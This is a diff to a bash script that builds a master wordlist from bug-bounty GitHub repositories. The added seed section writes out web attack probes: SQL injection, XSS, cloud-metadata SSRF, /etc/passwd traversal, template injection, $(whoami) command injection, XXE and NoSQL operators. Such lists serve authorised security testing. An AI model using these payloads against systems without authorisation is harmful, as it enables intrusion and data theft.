@@ -98,6 +98,26 @@ REPOS=(
     "KingOfBugbounty/KingOfBugBountyTips"
 )
 
+# ── SEED DATA (Professional Baseline) ──────────────────────
+seed_data() {
+    echo "[*] Injecting professional baseline seeds..."
+    cat <<EOF >> "${TEMP_DIR}/new_master.txt"
+' OR 1=1--
+admin' #
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+http://169.254.169.254/latest/meta-data/
+../../../../etc/passwd
+{{7*7}}
+\$(whoami)
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+{"\$gt": ""}
+eyjhbgcioijsuzi1nij9.eyjzdwiioijhzg1pbiisimlhdcixntexndk0mziyfq.
+__proto__[test]=test
+wp-config.php
+EOF
+}
+
 # ── FETCH FUNCTION ──────────────────────────────────────────
 curl_github() {
     local url=$1
@@ -139,14 +159,18 @@ discover_and_fetch() {
     done < <(echo "$response" | grep -oP '"path": "\K[^"]+\.txt(?=")')
 }
 
-echo "[*] Starting crawl of ${#REPOS[@]} repositories..."
-for repo in "${REPOS[@]}"; do
-    discover_and_fetch "$repo"
-done
+echo "[*] Starting crawl..."
+if [[ "$1" != "--skip-crawl" ]]; then
+    for repo in "${REPOS[@]}"; do
+        discover_and_fetch "$repo"
+    done
+fi
 
 # ── COMPILE MASTER ──────────────────────────────────────────
 echo "[*] Compiling master database..."
-cat "$TEMP_DIR"/*.clean 2>/dev/null | sort -u > "${TEMP_DIR}/new_master.txt"
+seed_data
+cat "$TEMP_DIR"/*.clean 2>/dev/null | sort -u >> "${TEMP_DIR}/new_master.txt"
+sort -u "${TEMP_DIR}/new_master.txt" -o "${TEMP_DIR}/new_master.txt"
 
 if [ ! -s "${TEMP_DIR}/new_master.txt" ]; then
     echo "[!] Empty dataset. Aborting."
